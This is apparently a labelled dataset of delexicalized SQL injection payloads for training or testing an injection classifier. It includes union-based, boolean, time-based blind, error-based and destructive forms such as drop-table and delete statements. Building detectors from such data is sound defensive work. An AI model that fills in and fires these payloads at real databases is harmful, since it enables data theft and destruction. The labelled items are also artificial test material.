payload_delex,type_id
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ % "" ) ) order by __INT__#",0
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = case where __IDENT__ = __IDENT__",2
-__INT__' ) union all select __INT__ --,7
-__INT__ % __STR__ % __STR__,2
"__INT__ ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( __IDENT__",3
"__INT__"" ) ) ) order by __INT__#",0
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
-__INT__ % __STR__ % __STR__,2
-__INT__ ) where __INT__ = __INT__ or __INT__ = __INT__,2
-__INT__ % __STR__ % __STR__,2
-__INT__' or __INT__ = __INT__#,2
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__' or \ < \ union select __INT__ , @@__IDENT__ -- __INT__",7
"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ % ' ) union all select __INT__#,7
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__"" ) where __INT__ = __INT__ order by __INT__#",0
"-__INT__ % "" ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select null , null --",7
1capa2ad * or,2
waitfor __IDENT__ __STR__ --,6
-6086__STR__ozbj__STR__ozbj,2
or __STR__ = '__INT__,2
-__INT__ or __INT__ = __INT__,2
-__INT__ where __INT__ = __INT__ order by __INT__ --,0
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
-__INT__ % ' ) ) ) or __INT__ = __INT__,2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
"-__INT__' where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
or case when [__IDENT__] = [__IDENT__] then [__IDENT__] else __IDENT__ ( __STR__ ) end or case when [__IDENT__] then [__IDENT__] else __IDENT__ ( __STR__ ) end,2
"__INT__' ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
1__STR__fbka__STR__fbka,2
__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,6
"__INT__ % ' ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,6
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__",2
"-__INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ ) and sleep ( __INT__ ),6
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
-__INT__' where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__ % "" order by __INT__ --",0
__INT__' and __INT__ = __INT__,2
"__INT__ % __IDENT__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( % __STR__",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"insert into __IDENT__ ( __IDENT__ , order , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",6
__INT__ % ' ) ) and __INT__ = __INT__ --,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
delete from __IDENT__,2
"__INT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__ where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
) ) or ( ( __STR__ ) ) = ( ( '__IDENT__,2
""" ) or true --",2
"-__INT__ % ) or elt ( __INT__ = __INT__ , __INT__ ) and ( % __STR__",2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
"__INT__"" ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
-__INT__ order by __INT__ --,0
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
__IDENT__' and __IDENT__ is null,2
-__INT__ or __INT__ = __INT__ -- __IDENT__,2
"-3009__STR__gqbo' where __INT__ = __INT__ union all select __INT__ , __INT__ --",7
"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
-__INT__' ) order by __INT__#,0
"alter table __IDENT__ __IDENT__ __IDENT__ __IDENT__ ( __INT__ ) , __IDENT__ __IDENT__ __IDENT__ ( __INT__ ) , __IDENT__ __IDENT__ __IDENT__ ( __INT__ ) , __IDENT__ __IDENT__ __IDENT__ ( __INT__ )",0
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__' ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__' ) ) or __INT__ = __INT__,2
"__INT__ % "" rlike sleep ( __INT__ ) #",6
"-__INT__"" union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__"" ) ) and __INT__ = __INT__#",2
"__INT__ % "" ) and sleep ( __INT__ ) #",6
"__INT__ % and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and % __STR__",6
"elt ( [__IDENT__] = [__IDENT__] , [__IDENT__] ) elt ( [__IDENT__] , [__IDENT__] )",2
__INT__ ) ) ) or sleep ( __INT__ ) #,6
"-__INT__' where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__"" ) ) ) order by __INT__ --",0
__INT__ ) rlike sleep ( __INT__ ) and ( __IDENT__,6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
-__INT__' ) ) or __INT__ = __INT__ --,2
__INT__ % ' ) ) and sleep ( __INT__ ) #,6
-__INT__ % __STR__ % __STR__,2
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __INT__ = __INT__",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__"" where __INT__ = __INT__ and __INT__ = __INT__#",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"-__INT__ % "" union all select __INT__ , __INT__ --",7
"-__INT__ ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,0
"__INT__ ) and __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
__INT__ ) waitfor __IDENT__ __IDENT__,6
__INT__ % ' and __INT__ = __INT__#,2
"-__INT__"" ) ) ) or __INT__ = __INT__",2
"-__INT__"" or __INT__ = __INT__ --",2
__INT__ % ) and sleep ( __INT__ ) and ( % __STR__,6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --",0
"-__INT__"" ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ % "" ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__"" and __INT__ = __INT__ --",2
"__INT__"" order by __INT__#",0
-__INT__' where __INT__ = __INT__ union all select __INT__ --,7
-__INT__' ) order by __INT__ --,0
__INT__ % waitfor __IDENT__ __TIME__ and % __STR__,6
"__INT__ % "" ) ) ) and __INT__ = __INT__ --",2
"__INT__"" ) and __INT__ = __INT__ --",2
update by set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__"" ) ) order by __INT__ --",0
__INT__ ) ) ) and __INT__ = __INT__ and ( ( ( __INT__ = __INT__,2
__INT__' ) and __INT__ = __INT__,2
"__INT__"" ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"-__INT__"" or elt ( __INT__ = __INT__ , __INT__ )",2
-__INT__ ) ) or __INT__ = __INT__ and ( ( __INT__ = __INT__,2
__INT__ ) ) ) and sleep ( __INT__ ) and ( ( ( __IDENT__,6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
-__INT__' ) ) or __INT__ = __INT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"-__INT__"" ) ) order by __INT__#",0
"__INT__"" ) ) ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
delete from __IDENT__,2
"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __INT__ = __INT__",6
"__INT__' in __IDENT__ __IDENT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) #",6
-__INT__' ) or __INT__ = __INT__,2
"__INT__ ) ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __IDENT__",6
"-__INT__' ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ ) ) ) and __INT__ = __INT__ and ( ( ( __INT__ = __INT__,2
__INT__ ) ) or sleep ( __INT__ ) and ( ( __IDENT__,6
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = """,2
"__INT__' ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"-__INT__"" where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__"" ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
1__STR__txex__STR__txex,2
' ; drop table __IDENT__ ; --,5
"__INT__ % "" ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
__INT__ where __INT__ = __INT__ and __INT__ = __INT__#,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , table , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"select * from __IDENT__ where __IDENT__ = __INT__ union select null , __IDENT__ from __IDENT__ where __IDENT__ = __INT__ -- __INT__",7
__INT__' where __INT__ = __INT__ and sleep ( __INT__ ) #,6
"-__INT__' union all select __INT__ , __INT__ , __INT__#",7
""" ) ; waitfor __IDENT__ __STR__ --",6
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ like '__IDENT__",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , like , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ ) ) waitfor __IDENT__ __TIME__ and ( ( __IDENT__,6
__INT__ where __INT__ = __INT__ waitfor __IDENT__ __TIME__ --,6
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"__INT__ % "" and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__' ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) --,6
__INT__ % ' ) ) ) and __INT__ = __INT__#,2
"__INT__"" ) ) union all select null , null , null , null --",7
-__INT__' ) or __INT__ = __INT__#,2
-__INT__ ) where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by create,7
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"-__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"__INT__ ) where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
__INT__ and __INT__ = __INT__,2
) or ( __STR__ = '__IDENT__,2
__INT__ % ' ) or sleep ( __INT__ ) #,6
__INT__ ) order by __INT__#,0
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
__INT__' in __IDENT__ __IDENT__ ) and __INT__ = __INT__#,2
end and __STR__ = '__IDENT__,2
"__INT__ % "" ) ) ) and __INT__ = __INT__",2
delete from __IDENT__,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
delete from __IDENT__ where __IDENT__ = __STR__,2
-9331__STR__rddk__STR__rddk,2
-7851__STR__dvbw__STR__dvbw,2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = """,2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __INT__ = __INT__",2
"-__INT__"" union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ % ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( % __STR__",6
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
__INT__ ) and ( __INT__ = __INT__ ) * __INT__,2
__INT__ ) ) ) and ( __INT__ = __INT__ ) * __INT__ and ( ( ( __INT__ = __INT__,2
delete from __IDENT__,2
create __IDENT__ __IDENT__ __IDENT__ by __STR__,0
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
delete from __IDENT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
-9875__STR__mrxw__STR__mrxw,2
"__INT__' in __IDENT__ __IDENT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) #",2
"-__INT__"" ) ) ) or __INT__ = __INT__ --",2
__INT__' ) ) and __INT__ = __INT__ --,2
"waitfor __IDENT__ __STR__ and __STR__ = """,6
"__INT__"" ) and __INT__ = __INT__#",2
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__,2
__INT__' ) and __INT__ = __INT__#,2
"__INT__"" ) order by __INT__ --",0
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __STR__ like ""__IDENT__",2
-__INT__ % __STR__ % __STR__,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",2
"__INT__' in __IDENT__ __IDENT__ ) union all select null , null , null , null , null , null , null , null , null , null --",7
-__INT__' ) ) or __INT__ = __INT__ --,2
__INT__' and __INT__ = __INT__,2
"__INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-__INT__ ) or __INT__ = __INT__,2
"-__INT__"" union all select __INT__ , __INT__ , __INT__ --",7
__INT__ ) ) ) or sleep ( __INT__ ) and ( ( ( __INT__ = __INT__,6
__INT__ % ) waitfor __IDENT__ __TIME__ --,6
-__INT__ ) order by __INT__#,0
"__INT__ % "" union all select null , null --",7
-__INT__ % ' order by __INT__ --,0
"and elt ( [__IDENT__] = [__IDENT__] , sleep ( [__IDENT__] ) ) and elt ( [__IDENT__] , sleep ( [__IDENT__] ) )",6
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) -- __IDENT__",2
"__INT__ % ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( % __STR__",2
-2823__STR__skgh__STR__skgh,2
__INT__ ) ) union all select null#,7
"-__INT__ % "" ) or __INT__ = __INT__#",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__"" ) ) ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ ) ) waitfor __IDENT__ __IDENT__,6
__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#,2
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
1__STR__cryr__STR__cryr,2
"__INT__ % ' ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __INT__ = __INT__",2
__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#,2
"__INT__ % ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( % __STR__",2
-__INT__' or __INT__ = __INT__#,2
delete from __IDENT__ where __IDENT__ = __STR__,2
"waitfor __IDENT__ __STR__ and ( ( ( __STR__ like ""__IDENT__",6
"__INT__"" __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
